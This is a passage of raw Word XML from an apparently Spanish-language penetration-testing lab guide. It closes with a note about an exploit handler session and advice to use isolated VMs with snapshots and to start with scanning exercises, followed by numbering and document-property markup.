      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757E0A23" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sesión obtenida.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F57D60D" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Usa </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>VMs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> aisladas (Network: Host-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> o NAT con red interna) y </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>snapshots</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> para restaurar el estado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BB9BF1" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Empieza con ejercicios de </w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>escaneo</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> antes de la explotación.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FD9B8E" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00E149BA" w:rsidRPr="00E149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A544C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5AD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270A8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="62DE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F7433"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="24542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F22B79"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E44CF8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3934DD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="69B26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3D11D1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="61DC91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735C35"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4216CB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1F33F2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="23B4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E5038"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="51DE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864B5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8F1C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C52AA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="14845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242D06"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EFE6FE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6832998">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="770204138">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1949846410">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="908807427">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="284628512">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1587305243">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="72439277">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1476215385">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="473178645">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1034379948">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1377006108">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="885721724">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="2060127654">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1319263045">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1916817994">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="664939053">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="525868081">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1154107203">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="766853137">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1319265537">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="407149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A5B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00364637"/>
    <w:rsid w:val="004200CB"/>
    <w:rsid w:val="007C436B"/>
    <w:rsid w:val="00A41756"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AB1E08"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B840B2"/>
    <w:rsid w:val="00BE3275"/>
    <w:rsid w:val="00C00D45"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D17B9A"/>
    <w:rsid w:val="00E149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46D1452-D49F-44A1-BA75-B78B9EA6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711</Words>
  <Characters>4227</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>114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Ruiz</cp:lastModifiedBy>
  <cp:revision>8</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-10-19T10:51:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>